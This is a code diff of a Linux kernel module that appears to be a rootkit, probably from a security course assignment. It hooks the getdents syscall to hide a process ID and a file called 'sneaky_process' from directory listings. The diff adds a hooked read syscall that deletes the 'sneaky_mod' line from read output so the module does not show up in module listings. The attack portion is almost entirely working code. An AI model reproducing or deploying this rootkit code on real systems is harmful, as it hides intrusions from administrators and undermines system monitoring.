@@ -57,27 +57,39 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
 // This is used for all system calls.
 asmlinkage int (*original_call)(const char *pathname, int flags);
 
+// Function pointer will be used to save address of original 'read' syscall.
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+
 // Define our new sneaky version of the "getdents" syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
-  // Call the original 'getdents'
-  int numBytes = original_getdents(fd, dirp, count);
+  int numBytes;
+  int pos;
 
-  int pos = 0;
+  // Call the original 'getdents'
+  numBytes = original_getdents(fd, dirp, count);
+
+  pos = 0;
 
   while (pos < numBytes) {
-    struct linux_dirent *curr_dirp =
-        (struct linux_dirent *)((char *)dirp + pos);
-    int len = curr_dirp->d_reclen;
-    char d_type = *((char *)curr_dirp + len - 1);
+    struct linux_dirent *curr_dirp;
+    int len;
+    char d_type;
+
+    curr_dirp = (struct linux_dirent *)((char *)dirp + pos);
+    len = curr_dirp->d_reclen;
+    d_type = *((char *)curr_dirp + len - 1);
 
     // Process ID or regular file named "sneaky_process" found
     if (strcmp(curr_dirp->d_name, sneaky_pid) == 0 ||
         (strcmp(curr_dirp->d_name, "sneaky_process") == 0 &&
          d_type == DT_REG)) {
+      char *next_dirp;
+      size_t remaining_len;
+
       // Remove the current linux_dirent struct
-      char *next_dirp = (char *)curr_dirp + len;
-      size_t remaining_len = numBytes - pos - len;
+      next_dirp = (char *)curr_dirp + len;
+      remaining_len = numBytes - pos - len;
       memcpy(curr_dirp, next_dirp, remaining_len);
 
       return numBytes - len;
@@ -98,6 +110,35 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
     }
   }
   return original_call(pathname, flags);
+}
+
+// Define our new sneaky version of the "read" syscall
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+  size_t numBytes;
+  char *begin;
+  char *end;
+  size_t len;
+  size_t remaining_len;
+
+  // Call the original 'getdents'
+  numBytes = original_read(fd, buf, count);
+  if (numBytes == -1) {
+    return -1;
+  }
+
+  begin = strstr(buf, "sneaky_mod ");
+  if (begin == NULL) { // Not found
+    return numBytes;
+  }
+
+  // Found, then remove the line
+  end = strchr(begin, '\n');
+  len = end - begin + 1;
+  remaining_len = numBytes - (end - (char *)buf + 1);
+
+  // Found, then remove the line
+  memcpy(begin, end + 1, remaining_len);
+  return numBytes - len;
 }
 
 // The code that gets executed when the module is loaded
